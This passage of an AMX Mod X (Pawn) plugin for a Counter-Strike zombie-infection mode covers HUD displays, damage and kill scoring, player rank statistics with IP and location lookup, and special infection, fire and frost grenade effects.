    }
    client_print_color(0, print_team_grey, g_cAdvertisements[g_iMessage]);
    g_iMessage += 1;
    return 0;
}

public TaskHudXYZ()
{
    if (g_iHudMessage >= g_iHudAdvertisementsCount)
    {
        g_iHudMessage = 0;
    }
    set_hudmessage(random_num(0, 255), random_num(0, 255), random_num(0, 255), -1.00, 0.20, 2, 0.20, 6.00, 0.10, 0.20, -1);
    show_hudmessage(0, g_cHudAdvertisements[g_iHudMessage]);
    g_iHudMessage += 1;
    return 0;
}

public EventStatusValueHide(iPlayer)
{
    ClearSyncHud(iPlayer, g_iCenterMessageSync);
    return 0;
}

public TaskHud(iTask)
{
	static cPoints[15];
	static cPacks[15];
	static cHealth[15];
	static iPlayer;
	new Country[ 128 ], CityString[ 128 ];
	GetClientGeoData( iPlayer, CountryName, Country, 127 );
	GetClientGeoData( iPlayer, City, CityString, 127 );	
	iPlayer = iTask + -300;
	if (!g_bAlive[iPlayer])
	{
		iPlayer = pev ( iPlayer, pev_iuser2 );  
		if (!g_bAlive[iPlayer])
		{
			return 0;
		}
	}
	if (iTask + -300 != iPlayer)
	{
		AddCommas(get_user_health(iPlayer), cHealth, 14);
		AddCommas(g_iPacks[iPlayer], cPacks, 14);
		AddCommas(g_iPoints[iPlayer], cPoints, 14);
		set_hudmessage(10, 180, 150, -1.00, 0.79, 0, 6.00, 1.10, 0.00, 0.00, -1);
		ShowSyncHudMsg(iTask + -300, g_iDownMessageSync, "Spectating %s%s^nClass: %s, Health: %s  Armor: %d  Packs: %s  Points: %s^nFrom: %s, %s", g_vip[iPlayer] ? "(Gold Member ®)" : "", g_cName[iPlayer], g_cClass[iPlayer], cHealth, get_user_armor(iPlayer), cPacks, cPoints, Country, CityString);
	}
	else
	{
		AddCommas(get_user_health(iTask + -300), cHealth, 14);
		AddCommas(g_iPacks[iTask + -300], cPacks, 14);
		AddCommas(g_iPoints[iTask + -300], cPoints, 14);
		new color3;
		if (g_bZombie[iTask + -300])
		{
			color3 = 60;
		}
		else
		{
			color3 = 180;
		}
		new color4;
		if (g_bZombie[iTask + -300])
		{
			color4 = 135;
		}
		else
		{
			color4 = 120;
		}
		new color5;
		if (g_bZombie[iTask + -300])
		{
			color5 = 180;
		}
		else
		{
			color5 = 0;
		}
		set_hudmessage(color5, color4, color3, 0.02, 0.90, 0, 6.00, 1.10, 0.00, 0.00, -1);
		ShowSyncHudMsg(iTask + -300, g_iDownMessageSync, "%s, Health: %s  Armor: %d  Packs: %s  Points: %s", g_cClass[iTask + -300], cHealth, get_user_armor(iTask + -300), cPacks, cPoints);
	}
	TaskReward [iTask + -300] --;

	if ( TaskReward [iTask + -300] == 0 )
	{
		TaskReward [iTask + -300] = 600;
		
		client_print_color ( iTask + -300, print_team_grey, "^4[Zombie Outstanding]^1 You played^4 +10 minutes^1 then you receive^4 4^1 packs!");
		
		g_iPacks [iTask + -300] += 4;
	}	
	return 0;
}

public TaskRemoveRender(i)
{
	set_user_rendering( i, kRenderFxNone, 0, 0, 0, kRenderNormal, 0 );
}

public OnTouch(iWeapon, id)
{
	if ( !is_user_valid_connected ( id ) ) return HAM_IGNORED;
	
	if ( g_bZombie [id] || ( ( g_iPlayerType[id] & 4 || g_iPlayerType[id] & 8) && !g_bFake [id] ) ) return HAM_SUPERCEDE;
	
	return HAM_IGNORED;
}

public CmdNightVision(iPlayer)
{
	if (g_bFlash[iPlayer])
	{
		static Float:fCurrentTime;
		fCurrentTime = get_gametime();
		if (floatsub(fCurrentTime, g_fLastTime[iPlayer]) < 0.50)
		{
			return 1;
		}
		g_fLastTime[iPlayer] = fCurrentTime;
		g_bFlashEnabled[iPlayer] = !g_bFlashEnabled[iPlayer];
		remove_task(iPlayer + 350, 0);
		if (g_bFlashEnabled[iPlayer])
		{
			 set_task(0.10, "TaskFlash", iPlayer + 350, "", 0, "b", 0);
		}
	}
	return 1;
}

public TaskCheckFlash(iPlayer)
{
	if (!g_bConnected[iPlayer] || g_bAlive[iPlayer])
	{
		return 0;
	}
	g_bFlashEnabled[iPlayer] = true;
	g_bFlash[iPlayer] = true;
	remove_task(iPlayer + 350, 0);
	set_task(0.10, "TaskFlash", iPlayer + 350, "", 0, "b", 0);
	return 0;
}

public TaskFlash(iTask)
{
	new id = iTask + -350;
	static origin [3]; get_user_origin ( id, origin );
	message_begin ( MSG_ONE_UNRELIABLE, SVC_TEMPENTITY, _, id );
	write_byte ( TE_DLIGHT );
	write_coord ( origin [0] );
	write_coord ( origin [1] );
	write_coord ( origin [2] );
	write_byte ( 90  );
	write_byte ( 0 );
	write_byte ( 160  );
	write_byte ( 100  );
	write_byte ( 2 );
	write_byte ( 0 ); 
	message_end (  );
}

InfectionEffects ( id )
{
	static Origin [3]; get_user_origin ( id, Origin );
	
	if ( !g_bFrozen [id] )
	{	
		message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("ScreenFade"), _, id)
		write_short(4096)
		write_short(2048)
		write_short(0)
		write_byte(255)
		write_byte(0)
		write_byte(0)
		write_byte(255)
		message_end()	
	}
	
	message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("Damage"), _, id)
	write_byte(0)
	write_byte(0)
	write_long(DMG_NERVEGAS)
	write_coord(0)
	write_coord(0)
	write_coord(0)
	message_end()	
	
	message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("ScreenShake"), _, id)
	write_short(150000)
	write_short(25000)
	write_short(135000)
	message_end()	
	
	message_begin ( MSG_PVS, SVC_TEMPENTITY, Origin );
	write_byte ( TE_IMPLOSION );
	write_coord ( Origin [0] );
	write_coord ( Origin [1] );
	write_coord ( Origin[2] );
	write_byte ( 150 );
	write_byte ( 32 );
	write_byte ( 3 );
	message_end (  );
	 
	message_begin ( MSG_PVS, SVC_TEMPENTITY, Origin );
	write_byte ( TE_PARTICLEBURST );
	write_coord ( Origin [0] );
	write_coord ( Origin [1] );
	write_coord ( Origin [2] );
	write_short ( 50 );
	write_byte ( 70 );
	write_byte ( 3 );
	message_end (  );
	
	message_begin ( MSG_PVS, SVC_TEMPENTITY, Origin );
	write_byte ( TE_DLIGHT );
	write_coord ( Origin [0] );
	write_coord ( Origin [1] );
	write_coord ( Origin [2] );
	write_byte ( 20 );
	write_byte ( 240 );
	write_byte ( 0 );
	write_byte ( 0 );
	write_byte ( 2 );
	write_byte ( 0 );
	message_end (  );
}

public TaskBurn ( iTask )
{
	static origin [3], flags;
	static iPlayer;
	iPlayer = iTask + -200;	
	get_user_origin ( iPlayer, origin );
	flags = pev ( iPlayer, pev_flags );
	
	if ( g_bNoDamage [iPlayer] || ( flags & FL_INWATER ) || g_iBurningDuration [iPlayer] < 1 )
	{
		message_begin ( MSG_PVS, SVC_TEMPENTITY, origin );
		write_byte ( TE_SMOKE ); 
		write_coord ( origin [0] ); 
		write_coord ( origin [1] ); 
		write_coord ( origin [2] - 50 );
		write_short ( SmokeSpr ); 
		write_byte ( random_num (15, 20) ); 
		write_byte ( random_num (10, 20) );
		message_end (  );

		remove_task(iTask, 0);
		
		return;
	}

	if ( g_iPlayerType[iPlayer] & 1 && g_iPlayerType[iPlayer] & 2 && !random_num ( 0, 20 ) )
	{
		client_cmd(iPlayer, "spk %s", g_cZombieBurnSounds[random_num(0, 4)]);
	}

	if ( g_iPlayerType[iPlayer] & 1 && g_iPlayerType[iPlayer] & 2 && ( flags & FL_ONGROUND ) && 1.0 > 0.0 )
	{
		static Float: velocity [3];
		
		pev ( iPlayer, pev_velocity, velocity );
		
		xs_vec_mul_scalar ( velocity, 1.0, velocity );
		
		set_pev ( iPlayer, pev_velocity, velocity );
	}
	
	static health;
	
	health = pev ( iPlayer, pev_health ); 
	
	if ( health - floatround ( 20.0, floatround_ceil ) > 0 )
		
	fm_set_user_health ( iPlayer, health - floatround ( 20.0, floatround_ceil ) );
	
	message_begin ( MSG_PVS, SVC_TEMPENTITY, origin );
	
	write_byte ( TE_SPRITE );
	
	write_coord ( origin [0] + random_num (-5, 5) );
	
	write_coord ( origin [1] + random_num (-5, 5) ); 
	
	write_coord ( origin [2] + random_num (-10, 10) ); 
	
	write_short ( FlameSpr );
	
	write_byte ( random_num (5, 10) );
	
	write_byte ( 200 );
	
	message_end (  );

	g_iBurningDuration [iPlayer]--
}

public ScreenShakeEffect ( id, const Float: Seconds )
{
	message_begin ( MSG_ONE_UNRELIABLE, get_user_msgid ( "ScreenShake" ), {0, 0, 0}, id )
	write_short ( floatround ( 4096.0 * Seconds, floatround_round ) );
	write_short ( floatround ( 4096.0 * Seconds, floatround_round ) );
	write_short ( 1<<13 );
	message_end (  );
}

public ScreenFadeEffect ( id, const Float: Seconds, const Red, const Green, const Blue, const Alpha )
{      
	message_begin ( MSG_ONE_UNRELIABLE, get_user_msgid ( "ScreenFade" ), _, id );
	write_short ( floatround ( 4096.0 * Seconds, floatround_round ) );
	write_short ( floatround ( 4096.0 * Seconds, floatround_round ) );
	write_short ( 0x0000 );
	write_byte ( Red );
	write_byte ( Green );
	write_byte ( Blue );
	write_byte ( Alpha );
	message_end (  );
}

public _SecondaryMenu(iPlayer, iMenu, iItem)
{
    if (iItem != -3 && g_bAlive[iPlayer] && !g_bZombie[iPlayer] && !g_iPlayerType[iPlayer] && !g_bFake[iPlayer])
    {
        static iChoice;
        static iDummy;
        static cBuffer[3];
        menu_item_getinfo(iMenu,iItem, iDummy, cBuffer, charsmax ( cBuffer ), _, _, iDummy );
        iChoice = str_to_num(cBuffer);
        drop_weapons(iPlayer, 2)			
        give_item(iPlayer, g_cSecondaryEntities[iChoice]);
        cs_set_user_bpammo(iPlayer, g_iSecondaryWeapons[iChoice], 9999);
        menu_display(iPlayer, g_iPrimaryMenu, 0);
    }
    return 0;
}

public _PrimaryMenu(iPlayer, iMenu, iItem)
{
    if (iItem != -3 && g_bAlive[iPlayer] && !g_bZombie[iPlayer] && !g_iPlayerType[iPlayer])
    {
        static iChoice;
        static iDummy;
        static cBuffer[3];
        menu_item_getinfo(iMenu,iItem, iDummy, cBuffer, charsmax ( cBuffer ), _, _, iDummy );
        iChoice = str_to_num(cBuffer);
        drop_weapons(iPlayer, 1)
        give_item(iPlayer, g_cPrimaryEntities[iChoice]);
        cs_set_user_bpammo(iPlayer, g_iPrimaryWeapons[iChoice], 9999);
        if (!user_has_weapon(iPlayer, 4, -1))
        {
            give_item(iPlayer, "weapon_hegrenade");
        }
        if (!user_has_weapon(iPlayer, 25, -1))
        {
            give_item(iPlayer, "weapon_flashbang");
        }
        if (!user_has_weapon(iPlayer, 9, -1))
        {
            give_item(iPlayer, "weapon_smokegrenade");
        }
    }
    return 0;
}

public TaskShowMenu(iPlayer)
{
	if (g_bAlive[iPlayer] && !g_iPlayerType[iPlayer] && !g_bZombie[iPlayer])
	{
		menu_display(iPlayer, g_iSecondaryMenu, 0);
	}
	return 0;
}

stock drop_weapons ( id, dropwhat )
{
	static Weapons [32], Num, i, WeaponID;
	
	Num = 0;
	
	get_user_weapons ( id, Weapons, Num );
	
	for ( i = 0; i < Num; i ++ )
	{
		WeaponID = Weapons [i];
		
		if ( ( dropwhat == 1 && ( ( 1 << WeaponID ) & PRIMARY_WEAPONS_BIT_SUM ) ) || ( dropwhat == 2 && ( ( 1 << WeaponID ) & SECONDARY_WEAPONS_BIT_SUM ) ) )
		{
			static DropName [32], WeaponEntity;
			
			get_weaponname ( WeaponID, DropName, charsmax ( DropName ) );
			
			WeaponEntity = fm_find_ent_by_owner ( -1, DropName, id );
			
			set_pev ( WeaponEntity, pev_iuser1, cs_get_user_bpammo ( id, WeaponID ) );
			
			engclient_cmd ( id, "drop", DropName );
			
			cs_set_user_bpammo ( id, WeaponID, 0 );
		}
	}
}

public OnTakeDamagePost(Victim)set_pdata_float(Victim, 108, 1.0, 5);

public OnTakeDamage(Victim, Inflictor, Attacker, Float:Damage, DamageType)
{
	if ( Victim == Attacker || !is_user_valid_connected ( Attacker ) ) return HAM_IGNORED;
	
	if ( g_bRoundStart || g_bRoundEnd ) return HAM_SUPERCEDE;
	
	if ( g_bNoDamage [Victim] ) return HAM_SUPERCEDE;

	if ( g_bZombie [Attacker] == g_bZombie [Victim] ) return HAM_SUPERCEDE;
	
	if (!g_bZombie[Attacker])
	{
        if (g_iPlayerType[Attacker] & 8 && g_iWeapon[Attacker] == 18)
        {
            Damage = 3000.0;
            SetHamParamFloat(4, Damage);
        }
        else
        {
            if (g_iPlayerType[Attacker])
            {
                Damage *= 0.75;
                SetHamParamFloat(4, Damage);
            }
            if (g_bDoubleDamage[Attacker])
            {
                Damage *= 2.0;
                SetHamParamFloat(4, Damage);
            }
            if (((g_iWeapon[Attacker] == 28 && g_bGolden[Attacker]) || (g_iWeapon[Attacker] == 26 && g_bGoldenDeagle[Attacker])))
            {
				Damage *= 2.0;
				SetHamParamFloat(4, Damage);
            }			
            g_fDamage[Attacker] += floatround(Damage);
            while (g_fDamage[Attacker] > 500.0)
            {
                g_iPacks[Attacker]++;
                g_fDamage[Attacker] -= 500.0;
            }
            if (++g_iPosition[Attacker] == 8)
            {
				g_iPosition[Attacker] = 0;
            }
            set_hudmessage(0, 40, 80, g_flCoords[g_iPosition[Attacker]][0], g_flCoords[g_iPosition[Attacker]][1], 0, 0.10, 2.50, 0.02, 0.02, -1);
            show_hudmessage(Attacker, "%0.0f", Damage);		
        }
        return 1;
	}
	
	if ( DamageType & 1<<24 ) return HAM_SUPERCEDE;
	
	if ( g_iPlayerType[Attacker] & 1 )
	{
		if ( Inflictor == Attacker ) SetHamParamFloat ( 4, 250.0 );
		
		return HAM_IGNORED;
	}
	else if ( g_iPlayerType[Attacker] & 2 )
	{
		if ( Inflictor == Attacker ) SetHamParamFloat ( 4, 250.0 );
		
		return HAM_IGNORED;
	}
	
	if (g_iPlayerType[Attacker] & 1 || g_iPlayerType[Attacker] & 2 || g_iRoundType & 4 || g_iRoundType & 1 || g_iRoundType & 64 || g_iRoundType & 32 || g_iRoundType & 128 || g_iRoundType & 256 || g_iRoundType & 512 || GetHumans() == 1) return HAM_IGNORED;	

	static Float: Armor; pev ( Victim, pev_armorvalue, Armor );

	if ( Armor > 0.0 )
	{
		client_cmd(Victim, "spk ZombieOutstanding/armor_hit");
		
		set_pev ( Victim, pev_armorvalue, floatmax ( 0.0, Armor - Damage ) );
			
		return HAM_SUPERCEDE;
	}	
	MakeZombie(Attacker, Victim, false, false, false);	
	savePoints(Attacker)	
	return HAM_SUPERCEDE;
}

public OnKilled ( Victim, Attacker, shouldgib )
{
	g_bKilling[Victim] = false;
	g_bFlash[Victim] = true;
	g_bFlashEnabled[Victim] = true;
	g_bFrozen[Victim] = false;
	g_bTryder[Victim] = false;
	g_bGoldenDeagle[Victim] = false;
	g_bGolden[Victim] = false;	
	g_bUnlimitedClip[Victim] = 0;	
	remove_task(Victim + 350, 0);
	g_bAlive[Victim] = false;
	if ( g_bZombie [Victim] || !g_bZombie [Victim] )
	{
		remove_task(Victim + 200, 0);
	}
	
	if (!g_bZombie[Attacker])
	{
		if (g_iPlayerType[Attacker] & 8)
		{
			static Origin [3]; get_user_origin ( Victim, Origin );			
			message_begin ( MSG_PVS, SVC_TEMPENTITY, Origin );
			write_byte ( TE_LAVASPLASH ) ;
			write_coord ( Origin [0] );
			write_coord ( Origin [1] );
			write_coord ( Origin [2] - 26 ); 
			message_end (  );
			if (random_num(1, 4) == 1)
			{
				g_iPoints[Attacker] += 1;
				savePoints(Attacker)
				set_hudmessage(255, 180, 30, -1.00, 0.10, 1, 0.00, 1.75, 1.00, 1.00, -1);
				ShowSyncHudMsg(Attacker, g_iRegenerationSync, "== SNIPER ==^n!!!Randomly got +1 point!!!^n[25% chance per zombie]");
			}
		}
		else
		{
			g_iPacks[Attacker]++;
			if (g_iPlayerType[Attacker])
			{
				g_iPoints[Attacker]++;
				savePoints(Attacker)
			}
			else
			{
				g_iPoints[Attacker] += 2;
				savePoints(Attacker)
			}
			remove_task(Victim + 200, 0);
		}
		if (g_iPlayerType[Attacker])
		{
			SetHamParamInteger(3, 2);
		}
	}
	else
	{
		g_iPacks[Attacker] += 2;
		if (g_iPlayerType[Attacker])
		{
			g_iPoints[Attacker]++;
			savePoints(Attacker)
		}
		if (g_iZombieClass[Attacker] == 6 && g_iPlayerType[Attacker])
		{
			SetHamParamInteger(3, 2);
			message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("ScreenFade"), _, Attacker)
			write_short(4096)
			write_short(2048)
			write_short(0)
			write_byte(255)
			write_byte(0)
			write_byte(0)
			write_byte(255)
			message_end()				
		}
		if (g_iPlayerType[Attacker])
		{
			SetHamParamInteger(3, 2);
		}
	}
	g_iKillsThisRound[Attacker]++;
	savePoints(Attacker)	
	return;
}

public inforem()
{
	if (g_bRoundStart) return

	new z = GetZombies()
	new h = GetHumans()

	if (z == 1 && h == 1)
	{
		new lasthuman = GetLastHuman()
		new lastzombie = GetLastZombie()

		if (lasthuman != -1 && lastzombie != -1)
		{
			new zname[32], hname[32]
			get_user_name(lasthuman, hname, 31)
			get_user_name(lastzombie, zname, 31)

			set_hudmessage(150, 150, 150, 0.69, 0.68, 0, 6.0, 2.0, 0.1, 0.2, -1)
			ShowSyncHudMsg(0, g_iVersusSync, "%s VS  %s", hname, zname)
		}

		return
	}

	if (z == h || !z || !h) return

	if (z < h)
	{
		if (z <= 8)
		{
			set_hudmessage(150, 150, 150, 0.78, 0.68, 2, 6.0, 1.0, 0.1, 0.2, -1)
			ShowSyncHudMsg(0, g_iRemainingSync, "%d zombie%s remaining...", z, z==1?"":"s")
		}
	}

	else if (z > h)
	{
		if (h <= 8)
		{
			set_hudmessage(150, 150, 150, 0.78, 0.68, 2, 6.0, 1.0, 0.1, 0.2, -1)
			ShowSyncHudMsg(0, g_iRemainingSync, "%d human%s remaining...", h, h==1?"":"s")
		}
	}
}

public OnDeathMsg()
{
	static Killer = 0, Victim = 0, bool:headShot = false, Weapon[64] = { 0, ... }, \
		victimIp[64] = { 0, ... }, killerIp[64] = { 0, ... }, timeNow = 0, bool:killerValid = false, \
		bool:victimValid = false, bool:victimBOT = false, bool:killerBOT = false;

	Killer = read_data(1);
	Victim = read_data(2);
	headShot = bool:read_data(3);
	read_data(4, Weapon, charsmax(Weapon));
	ucfirst(Weapon);
	timeNow = get_systime();
	killerValid = isValidPlayer(Killer);
	victimValid = isValidPlayer(Victim);
	killerBOT = killerValid && is_user_bot(Killer) ? true : false;
	victimBOT = victimValid && is_user_bot(Victim) ? true : false;

	if (Killer == Victim && killerValid && !killerBOT)
	{
		get_user_ip(Victim, victimIp, charsmax(victimIp), 1);

		g_Deaths[Victim]++;
		g_Seen[Victim] = timeNow;
		format_time(g_seenString[Victim], charsmax(g_seenString[]), "%d.%m.%Y @ %H:%M");
		formatex(g_Ip[Victim], charsmax(g_Ip), "%s", victimIp);
		g_Score[Victim] -= 5;
		g_kpdRatio[Victim] = computeKpdRatio(Victim);
		g_kmdValue[Victim] = computeKmdValue(Victim);

		updateRank(Victim);
	}

	else if (victimValid && !victimBOT && !killerBOT && (!killerValid || equali(Weapon, "World", 5)))
	{
		get_user_ip(Victim, victimIp, charsmax(victimIp), 1);

		g_Deaths[Victim]++;
		g_Seen[Victim] = timeNow;
		format_time(g_seenString[Victim], charsmax(g_seenString[]), "%d.%m.%Y @ %H:%M");
		formatex(g_Ip[Victim], charsmax(g_Ip), "%s", victimIp);
		g_Score[Victim] -= 5;
		g_kpdRatio[Victim] = computeKpdRatio(Victim);
		g_kmdValue[Victim] = computeKmdValue(Victim);

		updateRank(Victim);
	}
	
	else if (killerValid && victimValid && !killerBOT && !victimBOT)
	{
		get_user_ip(Victim, victimIp, charsmax(victimIp), 1);
		get_user_ip(Killer, killerIp, charsmax(killerIp), 1);

		g_Deaths[Victim]++;
		g_Kills[Killer]++;

		if (headShot)
		{
			g_headShots[Killer]++;

			g_Score[Killer] += 10;
		}

		else
		{
			g_Score[Killer] += 5;
		}

		g_Seen[Victim] = timeNow;
		g_Seen[Killer] = timeNow;
		format_time(g_seenString[Victim], charsmax(g_seenString[]), "%d.%m.%Y @ %H:%M");
		format_time(g_seenString[Killer], charsmax(g_seenString[]), "%d.%m.%Y @ %H:%M");
		formatex(g_Ip[Victim], charsmax(g_Ip), "%s", victimIp);
		formatex(g_Ip[Killer], charsmax(g_Ip), "%s", killerIp);
		g_Score[Victim] -= 3;
		g_kpdRatio[Victim] = computeKpdRatio(Victim);
		g_kpdRatio[Killer] = computeKpdRatio(Killer);
		g_kmdValue[Victim] = computeKmdValue(Victim);
		g_kmdValue[Killer] = computeKmdValue(Killer);

		updateRank(Victim);
		updateRank(Killer);
	}
	new id = read_data(2)
	if(is_user_connected(id)) g_bKilling[id] = false	
}

public fw_ThinkGrenade(entity)
{
    if(!pev_valid(entity)) return HAM_IGNORED
    
    static Float:dmgtime, Float:current_time
    pev(entity, pev_dmgtime, dmgtime)
    current_time = get_gametime()
    
    if(dmgtime > current_time) return HAM_IGNORED
    
    if(pev(entity, pev_flTimeStepSound) == 5555)
    {
        Killing_Explode(entity)
        return HAM_SUPERCEDE
    }
    
    return HAM_IGNORED
}

public OnGrenadeThink(Entity)
{
	if ( !pev_valid ( Entity ) ) return HAM_IGNORED;

	static Float: DmgTime, Float: CurrentTime;
	
	pev ( Entity, pev_dmgtime, DmgTime );
	
	CurrentTime = get_gametime (  );
	
	if ( DmgTime > CurrentTime ) return HAM_IGNORED;
	
	switch ( pev ( Entity, pev_flTimeStepSound ) )
	{
		case 1111:
		{
			InfectionExplode ( Entity )
			
			return HAM_SUPERCEDE;
		}
		case 2222: 
		{
			FireExplode ( Entity );
			
			return HAM_SUPERCEDE;
		}
		case 3333: 
		{
			FrostExplode ( Entity );
			
			return HAM_SUPERCEDE;
		}
		case 4444:
		{
			HeExplode ( Entity );
			
			return HAM_SUPERCEDE;
		}
		case 5555:
		{
			Killing_Explode ( Entity );
			
			return HAM_SUPERCEDE;
		}			
	}
	
	return HAM_IGNORED;
}

public fwSetModel ( Entity, const Model [] )
{
	if ( strlen ( Model ) < 8 ) return;
	
	static ClassName [10];
		
	pev ( Entity, pev_classname, ClassName, charsmax ( ClassName ) );
		
	if ( equal ( ClassName, "weaponbox" ) )
	{
		set_pev ( Entity, pev_nextthink, get_gametime (  ) + 1.0 );
			
		return;
	}
	
	if ( Model [7] != 'w' || Model [8] != '_' ) return;
	
	static Float: DmgTime;
	
	pev ( Entity, pev_dmgtime, DmgTime );
	
	if ( DmgTime == 0.0 ) return;

	if ( g_bZombie [pev ( Entity, pev_owner )] )
	{
		if ( Model [9] == 'h' && Model [10] == 'e' )
		{
			fm_set_rendering ( Entity, kRenderFxGlowShell, 0, 250, 0, kRenderNormal, 16 );
			
			message_begin ( MSG_BROADCAST, SVC_TEMPENTITY );
			write_byte ( 22 ) ;
			write_short ( Entity );
			write_short ( TrailSpr );
			write_byte ( 10 );
			write_byte ( 10 );
			write_byte ( 0 );
			write_byte ( 250 );
			write_byte ( 0 );
			write_byte ( 200 );
			message_end (  );
			
			set_pev ( Entity, pev_flTimeStepSound, 1111 );
		}
	}
	else if ( Model [9] == 'h' && Model [10] == 'e' ) 
	{
		fm_set_rendering ( Entity, kRenderFxGlowShell, 200, 0, 0, kRenderNormal, 16 );
		
		message_begin ( MSG_BROADCAST, SVC_TEMPENTITY );
		write_byte ( 22 );
		write_short ( Entity );
		write_short ( TrailSpr );
		write_byte ( 10 );
		write_byte ( 10 );
		write_byte ( 200 );
		write_byte ( 0 );
		write_byte ( 0 );
		write_byte ( 200 );
		message_end (  );
		
		set_pev ( Entity, pev_flTimeStepSound, 2222 );
	}
	else if ( Model [9] == 'f' && Model [10] == 'l' )
	{
		fm_set_rendering ( Entity, kRenderFxGlowShell, 0, 100, 200, kRenderNormal, 16 );
		
		message_begin ( MSG_BROADCAST, SVC_TEMPENTITY );
		write_byte ( 22 );
		write_short ( Entity );
		write_short ( TrailSpr );
		write_byte ( 10 );
		write_byte ( 10 );
		write_byte ( 0 );
		write_byte ( 100 );
		write_byte ( 200 );
		write_byte ( 200 );
		message_end (  );

		set_pev ( Entity, pev_flTimeStepSound, 3333 );
	}
	else if ( Model[9] == 's' && Model[10] == 'm' ) 
	{
		fm_set_rendering ( Entity, kRenderFxGlowShell, 250, 100, 0, kRenderNormal, 16 );

		message_begin ( MSG_BROADCAST, SVC_TEMPENTITY );
		write_byte ( 22 );
		write_short ( Entity );
		write_short ( TrailSpr);
		write_byte ( 10 );
		write_byte ( 10 );
		write_byte ( 250 );
		write_byte ( 40 );
		write_byte ( 0 );
		write_byte ( 200 );
		message_end (  );
		
		set_pev ( Entity, pev_flTimeStepSound, 4444 );
	}	
}

public fw_SetModel(entity, const model[])
{
    if(!pev_valid(entity)) return FMRES_IGNORED
    
    static Float:dmgtime
    pev(entity, pev_dmgtime, dmgtime)
    
    if(dmgtime == 0.0) return FMRES_IGNORED
    
    static owner; owner = pev(entity, pev_owner)
    if(g_bKilling[owner] && model[9] == 'h' && model[10] == 'e')
    {
        fm_set_rendering ( entity, kRenderFxGlowShell, 127, 0, 255, kRenderNormal, 16 );
			
        message_begin ( MSG_BROADCAST, SVC_TEMPENTITY );
        write_byte ( 22 );
        write_short ( entity );
        write_short ( TrailSpr );
        write_byte ( 10 );
        write_byte ( 10 );
        write_byte ( 127 );
        write_byte ( 0 );
        write_byte ( 255 );
        write_byte ( 200 );
        message_end (  );
        
        set_pev(entity, pev_flTimeStepSound, 5555)
        g_bKilling[owner] = false
        
        return FMRES_SUPERCEDE
    }
    
    return FMRES_IGNORED
}

InfectionExplode ( Entity )
{
	if ( g_bRoundEnd ) return;
	
	static Float: Origin [3];
	
	pev ( Entity, pev_origin, Origin );
	
	CreateBlastInfection ( Origin );
	
	EmitSound ( Entity, CHAN_AUTO, "ZombieOutstanding/grenade_infection_explode.wav" );
	
	static Attacker;
	
	Attacker = pev ( Entity, pev_owner );
	
	static Victim;
	
	Victim = -1
	
	while ( ( Victim = engfunc ( EngFunc_FindEntityInSphere, Victim, Origin, 240.0 ) ) != 0 )
	{
		if ( !is_user_valid_alive ( Victim ) || g_bZombie [Victim] || g_bNoDamage [Victim] ) continue;
		
		if ( GetHumans (  ) == 1 )
		{
			ExecuteHamB ( Ham_Killed, Victim, Attacker, 0 );
			
			continue;
		}
		
		EmitSound ( Victim, CHAN_AUTO, g_cHumanNadeInfectSounds[random_num(0, 2)]);
		
		MakeZombie(Attacker, Victim, false, false, false);
		
	}
	engfunc ( EngFunc_RemoveEntity, Entity );
}

FireExplode ( Entity )
{
	static Float: Origin [3];
	
	pev ( Entity, pev_origin, Origin );
	
	CreateBlastFire ( Origin );
	
	EmitSound ( Entity, CHAN_WEAPON, "ZombieOutstanding/grenade_fire_explode.wav" );
	
	static Victim; 
	
	Victim = -1;
	
	while ( ( Victim = engfunc ( EngFunc_FindEntityInSphere, Victim, Origin, 240.0 ) ) != 0 )
	{
		if ( !is_user_valid_alive ( Victim ) || !g_bZombie [Victim] || g_bNoDamage [Victim] ) continue;
		
		if ( g_iPlayerType[Victim] & 1 || g_iPlayerType[Victim] & 2 )
			
		g_iBurningDuration [Victim] += 4;
		else
		g_iBurningDuration [Victim] += 4 * 5;

		if (!task_exists(Victim + 200, 0))
		{
			 set_task(0.20, "TaskBurn", Victim + 200, "", 0, "b", 0);
		}
	}
	engfunc ( EngFunc_RemoveEntity, Entity );
}

FrostExplode ( Entity )
{
	static Float: Origin [3];
	
	pev ( Entity, pev_origin, Origin )
	
	CreateBlastFrost ( Origin )

	EmitSound ( Entity, CHAN_WEAPON, "ZombieOutstanding/grenade_frost_explode.wav" );
	
	static Victim; 
	
	Victim = -1;
	
	while ( ( Victim = engfunc ( EngFunc_FindEntityInSphere, Victim, Origin, 240.0 ) ) != 0 )
	{
		if ( !is_user_valid_alive ( Victim ) || !g_bZombie [Victim] || g_bFrozen [Victim] || g_bNoDamage [Victim] ) continue;

		if ( g_iPlayerType[Victim] & 1 || g_iPlayerType[Victim] & 2)
		{
			static Origin_2 [3]; get_user_origin ( Victim, Origin_2 );

			EmitSound (Victim, CHAN_AUTO, "ZombieOutstanding/grenade_frost_freeze.wav" );

			message_begin ( MSG_PVS, SVC_TEMPENTITY, Origin_2 );
			write_byte ( TE_BREAKMODEL ); 
			write_coord ( Origin_2 [0] ); 
			write_coord ( Origin_2 [1] ); 
			write_coord ( Origin_2 [2] + 24 ); 
			write_coord ( 16 ); 
			write_coord ( 16 ); 
			write_coord ( 16 );
			write_coord ( random_num (-50, 50) );
			write_coord ( random_num (-50, 50) );
			write_coord ( 25 ); 
			write_byte ( 10 ); 
			write_short ( GlassSpr ); 
			write_byte ( 10 ); 
			write_byte ( 25 );
			write_byte ( 0x01 ); 
			message_end (  );
			
			continue;
		}
		
		fm_set_rendering ( Victim, kRenderFxGlowShell, 0, 100, 200, kRenderNormal, 25 );
		
		EmitSound ( Victim, CHAN_AUTO, "ZombieOutstanding/grenade_frost_freeze.wav");
		
		ExecuteHamB(Ham_Item_PreFrame, Victim);
		
		message_begin ( MSG_ONE, get_user_msgid ( "ScreenFade" ), _, Victim );
		write_short ( 0 );
		write_short ( 0 );
		write_short ( 0x0004 );
		write_byte ( 0 );
		write_byte ( 100 );
		write_byte ( 200 );
		write_byte ( 100 );
		message_end (  );
		
		if ( pev ( Victim, pev_flags ) & FL_ONGROUND )
		
		set_pev ( Victim, pev_gravity, 999999.9 );
		else
		set_pev ( Victim, pev_gravity, 0.000001 );

		g_bFrozen [Victim] = true;
		
		set_task ( 3.0, "RemoveFreeze", Victim );
	}
	
	engfunc ( EngFunc_RemoveEntity, Entity );
}

public RemoveFreeze ( id )
{
	if ( !g_bAlive [id] || !g_bFrozen [id] ) return;

	g_bFrozen [id] = false;
	
	if ( g_bZombie [id] )
	{
		if ( g_iPlayerType[id] & 1 )

